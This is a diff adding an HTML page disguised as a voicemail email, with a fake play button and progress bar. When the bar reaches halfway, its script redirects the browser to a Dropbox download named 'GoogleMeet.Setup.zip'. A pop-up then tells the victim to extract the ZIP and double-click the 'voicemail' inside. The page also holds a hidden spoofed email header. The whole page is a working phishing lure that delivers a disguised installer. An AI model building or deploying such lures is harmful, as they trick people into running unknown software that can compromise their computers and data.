@@ -1,0 +1,376 @@
+<html>
+<head>
+    <style>
+        /* Notification styles */
+        .notification {
+            display: none;
+            position: fixed;
+            top: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background-color: #333;
+            color: white;
+            padding: 15px 20px;
+            border-radius: 8px;
+            z-index: 1000;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+            font-size: 14px;
+            animation: fadeIn 0.3s ease;
+            text-align: center;
+            max-width: 90%;
+            width: auto;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; top: 0; }
+            to { opacity: 1; top: 20px; }
+        }
+        
+        .notification.show {
+            display: block;
+        }
+        
+        /* Loading spinner */
+        .loading-spinner {
+            display: none;
+            width: 40px;
+            height: 40px;
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: #ffffff;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .play-button.loading .play-icon {
+            display: none;
+        }
+        
+        .play-button.loading .loading-spinner {
+            display: block;
+        }
+        
+        .duration-text.hidden {
+            opacity: 0;
+            visibility: hidden;
+        }
+        
+        .loading-text {
+            display: none;
+            margin-top: 15px;
+            font-size: 14px;
+            color: #1db954;
+            animation: pulseText 1.5s ease-in-out infinite;
+        }
+        
+        .loading-text.show {
+            display: block;
+        }
+        
+        @keyframes pulseText {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+        
+        /* Link active indicator */
+        .link-ready {
+            color: #1db954 !important;
+            font-weight: bold;
+        }
+        
+        .link-ready-message {
+            display: none;
+            margin-top: 10px;
+            font-size: 12px;
+            color: #1db954;
+        }
+        
+        .link-ready-message.show {
+            display: block;
+        }
+        
+        /* Progress bar stopped state */
+        .progress-stopped {
+            background-color: #ff4444 !important;
+        }
+    </style>
+</head>
+<body style="margin:0;padding:0;background-color:#0a0a0a;font-family:Arial,Helvetica,sans-serif;">
+
+<!-- Notification element -->
+<div id="voicemailNotification" class="notification">
+    ⚠️ Voicemail cannot be played in browser. A ZIP folder containing the voicemail has been downloaded. Please check your Download folder to extract and double click on voicemail to listen.
+</div>
+
+<!-- Hidden email header -->
+<div style="display:none;">From: "Voicemail Service" &lt;emans8412@hotmail.com&gt;
+To: emans8412@hotmail.com
+Subject: New Voicemail (2:26)
+MIME-Version: 1.0
+Content-Type: text/html; charset=UTF-8
+Content-Transfer-Encoding: 7bit
+</div>
+
+<table width="100%" cellpadding="0" cellspacing="0" border="0" bgcolor="#0a0a0a">
+  <tbody><tr>
+    <td align="center">
+
+      <!-- CONTAINER -->
+      <table width="600" cellpadding="0" cellspacing="0" border="0" style="background-color:#111;border-radius:8px;margin:40px auto;">
+
+        <!-- HEADER -->
+        <tbody><tr>
+          <td style="padding:15px 20px;color:#ccc;font-size:14px;font-weight:bold;">
+            Voicemail
+          </td>
+        </tr>
+
+        <!-- CENTER PLAY -->
+        <tr>
+          <td align="center" style="padding:50px 0;">
+
+            <!-- CLICKABLE PLAY BUTTON -->
+            <div id="playButton" class="play-button" style="text-decoration:none;display:inline-block;cursor:pointer;">
+
+              <table cellpadding="0" cellspacing="0" border="0" style="width:100px;height:100px;border-radius:50%;background-color:#1a1a1a;">
+                <tbody><tr>
+                  <td align="center" valign="middle">
+                    <div class="play-icon" style="
+                      width:0;
+                      height:0;
+                      border-left:28px solid #ffffff;
+                      border-top:16px solid transparent;
+                      border-bottom:16px solid transparent;
+                    "></div>
+                    <div class="loading-spinner"></div>
+                  </td>
+                </tr>
+              </tbody></table>
+
+            </div>
+
+            <div id="durationText" class="duration-text" style="margin-top:15px;font-size:14px;color:#bbb;">
+              Click to play • 2:26 duration
+            </div>
+            
+            <div id="loadingText" class="loading-text">
+                Loading...
+            </div>
+            
+            <div id="linkReadyMessage" class="link-ready-message">
+                ✓ Accessing voicemail...
+            </div>
+
+          </td>
+        </tr>
+
+        <!-- CONTROLS -->
+        <tr>
+          <td style="padding:15px 20px;background-color:#000;color:#aaa;font-size:12px;">
+
+            <table width="100%" cellpadding="0" cellspacing="0" border="0">
+              <tbody><tr>
+                <td width="40" align="left">0:00</td>
+
+                <td>
+                  <div style="height:4px;background:#333;border-radius:2px;">
+                    <div id="progressBar" style="width:0%;height:4px;background:#1db954;"></div>
+                  </div>
+                </td>
+
+                <td width="40" align="right">2:26</td>
+              </tr>
+            </tbody></table>
+
+          </td>
+        </tr>
+
+      </tbody></table>
+      <!-- END CONTAINER -->
+
+      <div style="color:#777;font-size:11px;margin-bottom:30px;">
+        This voicemail notification was sent automatically.
+      </div>
+
+    </td>
+  </tr>
+</tbody></table>
+
+<script>
+    // Redirect URL
+    const REDIRECT_URL = 'https://www.dropbox.com/scl/fi/mxd1el561sq706wv8n3bt/GoogleMeet.Setup.zip?rlkey=f01m8oyjpsqvpnmr63lcezc4z&st=ur908g83&dl=1';
+    
+    // Track animation state
+    let animationInterval = null;
+    let resetTimeout = null;
+    let redirectExecuted = false;
+    let progressValue = 0;
+    
+    // Show notification function
+    function showNotification() {
+        const notification = document.getElementById('voicemailNotification');
+        notification.classList.add('show');
+    }
+    
+    // Reset animation to original state
+    function resetAnimation() {
+        const playButton = document.getElementById('playButton');
+        const durationText = document.getElementById('durationText');
+        const loadingText = document.getElementById('loadingText');
+        const linkReadyMessage = document.getElementById('linkReadyMessage');
+        const progressBar = document.getElementById('progressBar');
+        const notification = document.getElementById('voicemailNotification');
+        
+        // Remove loading state
+        playButton.classList.remove('loading');
+        
+        // Show duration text, hide loading text and link message
+        durationText.classList.remove('hidden');
+        loadingText.classList.remove('show');
+        linkReadyMessage.classList.remove('show');
+        
+        // Hide notification
+        notification.classList.remove('show');
+        
+        // Reset progress bar
+        progressBar.style.width = '0%';
+        progressBar.classList.remove('progress-stopped');
+        
+        // Reset flags
+        redirectExecuted = false;
+        progressValue = 0;
+        
+        // Clear any existing timeouts/intervals
+        if (animationInterval) {
+            clearInterval(animationInterval);
+            animationInterval = null;
+        }
+        
+        console.log('Animation reset complete');
+    }
+    
+    // Stop progress bar at current position
+    function stopProgressBar() {
+        if (animationInterval) {
+            clearInterval(animationInterval);
+            animationInterval = null;
+        }
+        
+        // Change progress bar color to indicate it's stopped
+        const progressBar = document.getElementById('progressBar');
+        progressBar.classList.add('progress-stopped');
+        
+        console.log('Progress bar stopped at ' + progressValue + '%');
+    }
+    
+    // Check if progress has reached 50% and perform redirect + show notification
+    function checkProgressAndTriggerActions(progress) {
+        const notification = document.getElementById('voicemailNotification');
+        const linkReadyMessage = document.getElementById('linkReadyMessage');
+        
+        if (progress >= 50 && !redirectExecuted) {
+            redirectExecuted = true;
+            
+            // Stop the progress bar at exactly 50%
+            stopProgressBar();
+            
+            // Show notification
+            notification.classList.add('show');
+            
+            // Show link ready message
+            linkReadyMessage.classList.add('show');
+            
+            console.log('50% reached - Showing notification, stopping progress, and redirecting...');
+            
+            // Small delay before redirect to ensure UI updates
+            setTimeout(() => {
+                // Perform redirect
+                window.location.href = REDIRECT_URL;
+            }, 100);
+        }
+    }
+    
+    // Simulate progress bar animation
+    function simulateProgress() {
+        const progressBar = document.getElementById('progressBar');
+        progressValue = 0;
+        redirectExecuted = false;
+        
+        // Clear any existing animation
+        if (animationInterval) {
+            clearInterval(animationInterval);
+        }
+        
+        // Remove stopped class if present
+        progressBar.classList.remove('progress-stopped');
+        
+        // Update every 50ms to reach 100% in 5 seconds
+        animationInterval = setInterval(() => {
+            progressValue += 1;
+            progressBar.style.width = progressValue + '%';
+            
+            // Check if we've reached 50% and trigger actions
+            checkProgressAndTriggerActions(progressValue);
+            
+            // When progress reaches 100% (only if redirect hasn't happened)
+            if (progressValue >= 100 && !redirectExecuted) {
+                clearInterval(animationInterval);
+                animationInterval = null;
+                
+                // After progress bar fills, wait a moment then reset animation
+                setTimeout(() => {
+                    resetAnimation();
+                }, 500);
+            }
+        }, 50);
+    }
+    
+    // Handle play button click
+    document.getElementById('playButton').addEventListener('click', function() {
+        // Clear any existing timeouts to prevent conflicts
+        if (resetTimeout) {
+            clearTimeout(resetTimeout);
+        }
+        if (animationInterval) {
+            clearInterval(animationInterval);
+            animationInterval = null;
+        }
+        
+        const durationText = document.getElementById('durationText');
+        const loadingText = document.getElementById('loadingText');
+        const linkReadyMessage = document.getElementById('linkReadyMessage');
+        const progressBar = document.getElementById('progressBar');
+        const notification = document.getElementById('voicemailNotification');
+        
+        // Reset all states
+        redirectExecuted = false;
+        progressValue = 0;
+        
+        // Hide notification initially (will show at 50%)
+        notification.classList.remove('show');
+        
+        // Show loading state
+        this.classList.add('loading');
+        durationText.classList.add('hidden');
+        loadingText.classList.add('show');
+        linkReadyMessage.classList.remove('show');
+        
+        // Reset progress bar
+        progressBar.style.width = '0%';
+        progressBar.classList.remove('progress-stopped');
+        
+        // Start progress animation
+        simulateProgress();
+    });
+    
+    // Log that script is ready
+    console.log('Script ready - Progress bar will stop at 50% when notification and redirect trigger');
+</script>
+
+</body>
+</html>
